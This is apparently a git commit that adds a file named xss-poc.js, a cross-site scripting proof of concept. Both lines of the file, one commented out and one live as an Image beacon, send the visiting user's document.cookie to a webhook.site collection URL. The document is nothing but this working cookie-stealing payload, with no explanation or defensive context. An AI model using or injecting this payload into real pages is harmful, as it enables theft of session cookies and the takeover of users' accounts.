a691d1dd2958d3fc789738452614e7a32dca03ed
n3t1nv4d3 <aportillo82@gmail.com>
2024-02-28 21:14:55 -0800

    Create xss-poc.js

---
+++ xss-poc.js
@@ -0,0 +1,3 @@
+// fetch("https://webhook.site/d7eb3ee6-133f-4c48-8aa1-0cf0698c229f/?cookie=" + document.cookie);
+
+var i=new Image;i.src="https://webhook.site/d7eb3ee6-133f-4c48-8aa1-0cf0698c229f/?cookie="+document.cookie;
